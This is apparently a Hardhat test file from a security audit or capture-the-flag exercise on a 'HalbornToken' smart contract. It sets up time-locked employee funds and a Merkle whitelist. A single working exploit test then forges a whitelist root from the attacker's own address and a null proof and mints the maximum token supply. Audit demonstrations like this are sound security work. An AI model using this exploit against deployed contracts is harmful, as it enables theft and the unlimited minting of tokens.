const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[HalbornToken] Exploits', function() {
	let attacker, employees;

	beforeEach(async function() {
		[steve, alice, bob, charlie, david, whitelisted, attacker] = await ethers.getSigners();
		employees = [alice, bob, charlie, david];

		// Setup a whitelisted address for testing 'validity' and 'mintTokensWithWhitelist' functions
		let whitelistedHash = ethers.utils.solidityKeccak256(['address'], [whitelisted.address]);
		
		// Create bytes32 proof from a "password" 
		let proof = ethers.utils.keccak256(ethers.utils.id("S3CUR3_PR00F"));
		
		// Root is keccak256 of the whitelisted address hash and "password" proof that will pass the 'verify' function
		let root = ethers.utils.solidityKeccak256(
			['bytes32', 'bytes32'], 
			ethers.BigNumber.from(whitelistedHash) <= ethers.BigNumber.from(proof) ? [proof, whitelistedHash] : [whitelistedHash, proof] // Check hashing order for MerkleTree
		);
		// console.log("[JS]\nhash:", whitelistedHash, '\nproof:', proof, '\nroot:', root);

		// Steve deploy the contract
		let deployerFunds = ethers.utils.parseEther('10000');
		this.token = await (await ethers.getContractFactory('HalbornToken', steve)).deploy(
			"HalbornToken", // Name
			"HAL", // Symbol
			deployerFunds, // Minted amount for deployer Steve
			steve.address, // Deployer address
			root
		);

		expect(
			await this.token.balanceOf(steve.address)
		).to.be.equal(deployerFunds); // Check deployer minted tokens

		// Transfer 100 tokens to each employees
		let employeeFunds = ethers.utils.parseEther('100');
		for (let i = 0; i < employees.length; ++i){
			let now = (await ethers.provider.getBlock(await ethers.provider.getBlockNumber())).timestamp;
			await (await this.token.connect(steve)).transfer(employees[i].address, employeeFunds);
			await (await this.token.connect(employees[i])).newTimeLock(
				employeeFunds,
				now + 60, // vestTime
				now + 3600*24*30*6, // cliffTime ~ 6 months from now
				now + 3600*24*30*12 // disbursementPeriod ~ 1 year from now
			);

			expect(
				await this.token.balanceOf(employees[i].address)
			).to.be.equal(employeeFunds); // Checks balance of employee is 100 tokens 

			await expect(
				(await this.token.connect(employees[i])).transfer(steve.address, employeeFunds)
			).to.be.reverted; // Checks that tokens are locked
		}

		let whitelistedFunds = ethers.utils.parseEther('10');
		await (await this.token.connect(whitelisted)).mintTokensWithWhitelist(whitelistedFunds, root, [proof]); // Check validity of root + proof
		expect(
			await this.token.balanceOf(whitelisted.address)
		).to.be.equal(whitelistedFunds); // Funds have been minted for whitelisted user

		this.attackerInstance = await this.token.connect(attacker);
	});

	it('[Exploit #1] \'root\' variable of the contract is set but never used', async function() {
		let attackerHash = ethers.utils.solidityKeccak256(['address'], [attacker.address]);
		let proof = ethers.constants.HashZero; // Null proof
		let root = ethers.utils.solidityKeccak256(['bytes32', 'bytes32'], [proof, attackerHash]); // Create valid root from attacker's address and empty proof
		
		let attackerFunds = ethers.constants.MaxUint256.sub(await this.token.totalSupply()); // Mint max amount of tokens available

		await this.attackerInstance.mintTokensWithWhitelist(attackerFunds, root, [proof]);
		expect(
			await this.token.balanceOf(attacker.address)
		).to.be.equal(attackerFunds);
	});
});